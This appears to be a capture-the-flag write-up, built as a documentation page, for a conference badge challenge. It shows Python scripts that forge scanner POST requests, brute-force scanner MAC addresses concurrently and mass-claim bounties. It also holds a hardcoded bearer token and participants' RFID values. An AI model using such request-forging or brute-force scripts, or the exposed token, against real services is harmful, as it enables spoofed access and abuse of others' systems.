@@ -1,0 +1,220 @@
+<!DOCTYPE html SYSTEM "about:legacy-compat">
+<html lang="en-US" data-preset="contrast" data-primary-color="#307FFF"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="UTF-8"><meta name="robots" content="noindex"><meta name="built-on" content="2024-10-13T20:44:56.6307894"><title>Extra | Instance Name</title><script type="application/json" id="virtual-toc-data">[{"id":"how-the-scanners-report-a-scan","level":0,"title":"How the scanners report a scan","anchor":"#how-the-scanners-report-a-scan"},{"id":"badge-reader-firmware","level":0,"title":"Badge Reader Firmware","anchor":"#badge-reader-firmware"},{"id":"simulating-the-binary","level":0,"title":"Simulating the Binary","anchor":"#simulating-the-binary"},{"id":"extra-mqtt-topic","level":0,"title":"Extra MQTT Topic","anchor":"#extra-mqtt-topic"}]</script><script type="application/json" id="topic-shortcuts"></script><link href="https://resources.jetbrains.com/writerside/apidoc/6.10.0-b419/app.css" rel="stylesheet"><meta name="msapplication-TileColor" content="#000000"><link rel="apple-touch-icon" sizes="180x180" href="https://jetbrains.com/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="https://jetbrains.com/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="https://jetbrains.com/favicon-16x16.png"><meta name="msapplication-TileImage" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-144x144.png"><meta name="msapplication-square70x70logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-70x70.png"><meta name="msapplication-square150x150logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-150x150.png"><meta name="msapplication-wide310x150logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-310x150.png"><meta name="msapplication-square310x310logo" content="https://resources.jetbrains.com/storage/ui/favicons/mstile-310x310.png"><meta name="image" content=""><!-- Open Graph --><meta property="og:title" content="Extra | Instance Name"><meta property="og:description" content=""><meta property="og:image" content=""><meta property="og:site_name" content="Instance Name Help"><meta property="og:type" content="website"><meta property="og:locale" content="en_US"><meta property="og:url" content="writerside-documentation/extra.html"><!-- End Open Graph --><!-- Twitter Card --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content=""><meta name="twitter:title" content="Extra | Instance Name"><meta name="twitter:description" content=""><meta name="twitter:creator" content=""><meta name="twitter:image:src" content=""><!-- End Twitter Card --><!-- Schema.org WebPage --><script type="application/ld+json">{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "@id": "writerside-documentation/extra.html#webpage",
+    "url": "writerside-documentation/extra.html",
+    "name": "Extra | Instance Name",
+    "description": "",
+    "image": "",
+    "inLanguage":"en-US"
+}</script><!-- End Schema.org --><!-- Schema.org WebSite --><script type="application/ld+json">{
+    "@type": "WebSite",
+    "@id": "writerside-documentation/#website",
+    "url": "writerside-documentation/",
+    "name": "Instance Name Help"
+}</script><!-- End Schema.org --></head><body data-id="Extra" data-main-title="Extra" data-article-props="{&quot;seeAlsoStyle&quot;:&quot;links&quot;}" data-template="article" data-breadcrumbs=""><div class="wrapper"><main class="panel _main"><header class="panel__header"><div class="container"><h3>Instance Name  Help</h3><div class="panel-trigger"></div></div></header><section class="panel__content"><div class="container"><article class="article" data-shortcut-switcher="inactive"><h1 data-toc="Extra" id="Extra.md">Extra</h1><section class="chapter"><h2 id="how-the-scanners-report-a-scan" data-toc="how-the-scanners-report-a-scan">How the scanners report a scan</h2><p id="-bhsh4d_7">You might notice some activity on MQTT when you scan your badge but this not how the server determines if a scan takes place. It uses http post request to /bouties</p><p id="-bhsh4d_8">It can be represented as</p><div class="code-block" data-lang="python">
+import requests
+
+url = &quot;https://hardwarelabs.io/bounties&quot;
+
+payload = &quot;{\r\n    \&quot;mac_address\&quot;: \&quot;30:30:F9:7B:90:AC\&quot;,\r\n    \&quot;rfid\&quot;: \&quot;f4bfd940\&quot;\r\n}&quot;
+headers = {}
+
+response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload)
+
+print(response.text)
+</div><p id="-bhsh4d_10">or</p><figure id="-bhsh4d_11"><img alt="image_5.png" src="images/image_5.png" title="image_5.png" width="651" height="252"></figure><p id="-bhsh4d_12">where rfid is the lower case UID. We discoverd the format through the serial messages produced by the badge reader.</p><p id="-bhsh4d_13">Badge reader serial:</p><div class="code-block" data-lang="none">
+[BADGE] Loading badge config...
+[BADGE] Loading bounties...
+[BADGE] WWHF Badge v1.27
+[BADGE] EC:DA:3B:5E:12:78
+[WiFi] Wi-Fi ready
+[WiFi] Station mode started
+[BOUNTY] Mounted bounty cache filesystem
+[WiFi] Station connected to AP
+[RFID] Bounty Captured: f4bfd940
+</div><p id="-bhsh4d_15">From here I wrote a script to brute force all the OUIs we saw on the network to try to hunt down the last event 5 scanner (We later found out this doesn't exist)</p><section class="chapter"><h3 id="scanner-brute-force" data-toc="scanner-brute-force">Scanner Brute Force</h3><div class="code-block" data-lang="python">
+import aiohttp
+import asyncio
+import json
+import itertools
+from tqdm import tqdm
+
+url = &quot;https://hardwarelabs.io/bounties&quot;
+
+# OUI of the scanners
+ouis = [&quot;34:B7:DA:5E&quot;,&quot;34:B7:DA:5F&quot;,&quot;34:B7:DA:5D&quot;]
+
+mac_suffix_range = range(0x00, 0xFF + 1)  # This will range from 00 to FF (0-255 in hex)
+
+headers = {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer W8nqEekeZ2a4LeXVVuQ2yNYwRrsDYT'
+}
+rfid = &quot;f4bfd940&quot;
+
+# Limit the number of concurrent requests
+MAX_CONCURRENT_REQUESTS = 1000
+
+async def send_request(session, mac_address):
+    payload = json.dumps({
+        &quot;mac_address&quot;: mac_address,
+        &quot;rfid&quot;: rfid
+    })
+    
+    async with session.post(url, headers=headers, data=payload) as response:
+       # print(await response.text())
+        #print(response.status)
+        if response.status == 201:  # Only print if the status is 201
+            response_text = await response.text()
+            print(f&quot;Testing MAC: {mac_address} -&gt; Response: {response_text}&quot;)
+            return True  # Indicating success
+        return False  # Indicating failure
+
+async def brute_force_mac_addresses():
+    total_mac_addresses = len(ouis) * (0xFF + 1) * (0xFF + 1)
+    progress = tqdm(total=total_mac_addresses, desc=&quot;Brute-forcing MAC addresses&quot;, unit=&quot;request&quot;)
+
+    # Set up the aiohttp session
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for oui in ouis:
+            for suffix1, suffix2 in itertools.product(mac_suffix_range, repeat=2):
+                mac_address = f&quot;{oui}:{suffix1:02X}:{suffix2:02X}&quot;
+                print(mac_address)
+                
+                # Create the task for each request
+                task = asyncio.ensure_future(send_request(session, mac_address))
+                tasks.append(task)
+                
+                # Send a batch of requests
+                if len(tasks) &gt;= MAX_CONCURRENT_REQUESTS:
+                    results = await asyncio.gather(*tasks)
+                    tasks = []  # Reset the task list
+                    progress.update(MAX_CONCURRENT_REQUESTS)
+
+        # Await any remaining tasks
+        if tasks:
+            await asyncio.gather(*tasks)
+            progress.update(len(tasks))
+    
+    progress.close()  # Close the progress bar when done
+
+if __name__ == &quot;__main__&quot;:
+    asyncio.run(brute_force_mac_addresses())
+</div></section><section class="chapter"><h3 id="all-scans-solver" data-toc="all-scans-solver">All scans solver</h3><p id="-bhsh4d_18"><span class="control" id="-bhsh4d_21">This code is from @CW0 and his <a href="https://github.com/Cooperw/ctf/tree/master/2024-10-11-wwhf24" id="-bhsh4d_22" data-external="true" rel="noopener noreferrer">repo</a></span></p><div class="code-block" data-lang="python">
+# claim_bounties.py :: GPT-4o
+
+# usage: python claim_bounties.py 7bdfd941
+
+import requests
+import sys
+import argparse
+import time
+import os
+
+
+'''
+export API_BEARER_TOKEN=&quot;W8nqEekeZ2a4LeXVVuQ2yNYwRrsDYT&quot;
+
+7bdfd940 shiloh
+f4b4d940 logix
+7159d940 vort
+fcb9d940 alex
+a3c9d940 rsulliva
+57b4d940 netwarsninja66
+'''
+
+def main():
+    # Define the list of MAC addresses
+    mac_addresses = [
+        &quot;EC:DA:3B:5D:D0:7C&quot;,
+        &quot;EC:DA:3B:5E:0C:24&quot;,
+        &quot;EC:DA:3B:5E:0C:34&quot;,
+        &quot;EC:DA:3B:5E:0C:88&quot;,
+        &quot;EC:DA:3B:5E:11:D8&quot;,
+        &quot;EC:DA:3B:5E:11:E8&quot;,
+        &quot;EC:DA:3B:5E:11:F0&quot;,
+        &quot;EC:DA:3B:5E:11:F4&quot;,
+        &quot;EC:DA:3B:5E:12:30&quot;,
+        &quot;EC:DA:3B:5E:12:34&quot;,
+        &quot;EC:DA:3B:5E:12:78&quot;,
+        &quot;EC:DA:3B:5E:12:8C&quot;,
+        &quot;EC:DA:3B:5E:12:90&quot;,
+        &quot;EC:DA:3B:5E:12:A8&quot;,
+        &quot;EC:DA:3B:5E:16:D0&quot;,
+        &quot;EC:DA:3B:5E:16:F0&quot;,
+        &quot;EC:DA:3B:5E:1F:80&quot;,
+        &quot;EC:DA:3B:5E:1F:C8&quot;,
+        &quot;EC:DA:3B:5E:48:30&quot;,
+        &quot;EC:DA:3B:5E:53:F8&quot;,
+        &quot;EC:DA:3B:5E:6D:48&quot;,
+        &quot;EC:DA:3B:5E:6D:54&quot;,
+        &quot;EC:DA:3B:5E:6D:5C&quot;,
+        &quot;EC:DA:3B:5E:6D:68&quot;,
+        &quot;EC:DA:3B:5E:6D:70&quot;,
+        &quot;EC:DA:3B:5E:6D:80&quot;,
+        &quot;EC:DA:3B:5F:5B:50&quot;,
+        &quot;EC:DA:3B:5F:FD:90&quot;,
+        &quot;EC:DA:3B:5F:FD:94&quot;,
+        &quot;EC:DA:3B:5F:FD:AC&quot;,
+        &quot;EC:DA:3B:5F:FD:B4&quot;,
+        &quot;EC:DA:3B:5F:FD:C0&quot;,
+        &quot;EC:DA:3B:5F:FD:C4&quot;,
+        &quot;EC:DA:3B:5E:17:30&quot; # unlisted
+    ]
+
+    # Set up command-line argument parsing
+    parser = argparse.ArgumentParser(description='Send POST requests to hardwarelabs.io/bounties.')
+    parser.add_argument('rfid', type=str, help='RFID value to include in the POST request.')
+    args = parser.parse_args()
+
+    rfid = args.rfid
+
+    endpoint = &quot;https://hardwarelabs.io/bounties&quot;
+
+    # Retrieve the Bearer Token from environment variables
+    bearer_token = os.getenv('API_BEARER_TOKEN')
+    if not bearer_token:
+        print(&quot;Error: API_BEARER_TOKEN environment variable not set.&quot;)
+        sys.exit(1)
+
+    headers = {
+        &quot;Content-Type&quot;: &quot;application/json&quot;,
+        &quot;Authorization&quot;: f&quot;Bearer {bearer_token}&quot;
+    }
+
+    success_count = 0
+    error_count = 0
+
+    for index, mac in enumerate(mac_addresses, start=1):
+        payload = {
+            &quot;mac_address&quot;: mac,
+            &quot;rfid&quot;: rfid
+        }
+
+        try:
+            response = requests.post(endpoint, json=payload, headers=headers)
+            if response.status_code == 201:
+                success_count += 1
+                print(f&quot;SUCCESS [{index}/{len(mac_addresses)}]: MAC {mac} - Status Code: {response.status_code}&quot;)
+            else:
+                error_count += 1
+                print(f&quot;ERROR   [{index}/{len(mac_addresses)}]: MAC {mac} - Status Code: {response.status_code} - Response: {response.text}&quot;)
+        except requests.exceptions.RequestException as e:
+            error_count += 1
+            print(f&quot;EXCEPTION[{index}/{len(mac_addresses)}]: MAC {mac} - {e}&quot;)
+
+        # Rate limiting: Wait for 5 seconds before the next request, except after the last request
+        if index &lt; len(mac_addresses):
+            time.sleep(5)  # Pause for 5 seconds
+
+    print(&quot;\n=== Summary ===&quot;)
+    print(f&quot;Total Requests: {len(mac_addresses)}&quot;)
+    print(f&quot;Successful (201): {success_count}&quot;)
+    print(f&quot;Failed: {error_count}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</div></section></section><section class="chapter"><h2 id="badge-reader-firmware" data-toc="badge-reader-firmware">Badge Reader Firmware</h2><p id="-bhsh4d_23">You can download from <a href="https://bucket.ics.red/reader.bin" id="-bhsh4d_24" data-external="true" rel="noopener noreferrer">here</a> <a href="https://bucket.ics.red/reader.bin" id="-bhsh4d_25" data-external="true" rel="noopener noreferrer">https://bucket.ics.red/reader.bin</a></p></section><section class="chapter"><h2 id="simulating-the-binary" data-toc="simulating-the-binary">Simulating the Binary</h2><p id="-bhsh4d_26">Cutter will attempt to simulate the code</p><figure id="-bhsh4d_27"><img alt="image_4.png" src="images/image_4.png" title="image_4.png" width="275" height="139"></figure></section><section class="chapter"><h2 id="extra-mqtt-topic" data-toc="extra-mqtt-topic">Extra MQTT Topic</h2><p id="-bhsh4d_28">Badge registration name is preformed using the mqtt topic <code class="code" id="-bhsh4d_29">/badges/{BadgeName}</code></p></section><div class="last-modified">Last modified: 14 October 2024</div><div data-feedback-placeholder="true"></div><div class="navigation-links _bottom"><a href="flags.html" class="navigation-links__prev">Flags</a></div></article><div id="disqus_thread"></div></div></section></main></div><script src="https://resources.jetbrains.com/writerside/apidoc/6.10.0-b419/app.js"></script></body></html>
